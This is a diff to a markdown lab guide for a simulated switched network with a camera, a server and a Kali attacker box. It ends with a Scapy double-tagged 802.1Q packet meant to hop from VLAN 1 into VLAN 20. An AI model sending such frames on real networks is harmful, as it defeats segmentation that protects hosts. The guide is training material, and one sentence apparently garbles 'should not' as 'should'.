@@ -14,9 +14,41 @@
 | SWITCH2  | Et0/0   | SWITCH1          | N/A     | Trunk (native VLAN 1) |
 | SWITCH2  | Et0/1   | CENTRAL_SERVER   | VLAN 20 | Access                |
 
-### IPv4 Addressing
+### VPCS Static IPv4 Configuration
 
-lorem ipsum
+Both CAMERA_01 and CENTRAL_SERVER are VPCS (virtual PC simulator) appliances. The following command configures IPv4 addreses. Set accordingly
+<pre>
+  ip 192.168.0.x/24
+  save
+</pre>
+
+### Docker Container IPv4 Configuration
+
+Configure the IP address of the Kali box
+
+R-Click -> Edit config
+
+![](assets/attacker-interfaces.png)
+
+### Verify
+
+CAMERA_01 should now be able to ping CENTRAL_SERVER
+
+![](assets/camera-server-ping.gif)
+
+
+ATTACKER should be able to ping CAMERA_01 or CENTRAL_SERVER due to network segmentation
+
+![](assets/attacker-ping.gif)
+
+Craft a double-tagged ICMP packet with Scapy
+
+<pre>
+  >>> packet = Ether(dst='ff:ff:ff:ff:ff:ff')/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.0.250')/ICMP()
+  >>> sendp(packet, iface="eth0")
+  .
+  Sent 1 packets.
+</pre>
 
 Create new vlan
 <pre>
@@ -80,32 +112,3 @@ Configure Et0/0 as static trunk port
 </pre>
 
 Repeat these step on SWITCH2
-
-Both CAMERA_01 and CENTRAL_SERVER are VPCS (virtual PC simulator) appliances. The following command configures IPv4 addreses. Set accordingly
-<pre>
-  ip 192.168.0.x/24
-  save
-</pre>
-
-CAMERA_01 should now be able to ping CENTRAL_SERVER
-
-![](assets/camera-server-ping.gif)
-
-Configure the IP address of the Kali box
-
-R-Click -> Edit config
-
-![](assets/attacker-interfaces.png)
-
-ATTACKER should be able to ping CAMERA_01 or CENTRAL_SERVER due to network segmentation
-
-![](assets/attacker-ping.gif)
-
-Craft a double-tagged ICMP packet with Scapy
-
-<pre>
-  >>> packet = Ether(dst='ff:ff:ff:ff:ff:ff')/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.0.250')/ICMP()
-  >>> sendp(packet, iface="eth0")
-  .
-  Sent 1 packets.
-</pre>
